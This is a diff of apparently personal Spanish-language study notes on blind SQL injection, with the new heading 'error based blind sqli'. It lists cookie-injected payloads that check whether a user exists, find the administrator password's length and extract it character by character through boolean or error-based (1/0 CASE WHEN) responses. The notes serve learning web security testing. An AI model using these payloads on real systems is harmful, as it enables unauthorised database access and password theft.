@@ -166,7 +166,7 @@ averiguar un usuario dentro de una tabla:
 cookie' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 si la respuesta es true, entonces el usuario existe
 
-averiguar contraseñas por medio de sqli:
+##averiguar contraseñas por medio de blind sqli boolean:
 
 averiguar longitud del password:
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>NUMERO_DE_LONGITUD_A_PREGUNTAR)='a
@@ -176,5 +176,9 @@ cookie' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administr
 
 siguiendo el ejemplo anterior, si la primer letra del password es 's', nos mantendremos logeados, de lo contrario, nos
 desloguearemos.
+
+##error based blind sqli
+cookie' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+En este caso, si la página da un error, quiere decir que la letra es la correspondiente
 
 
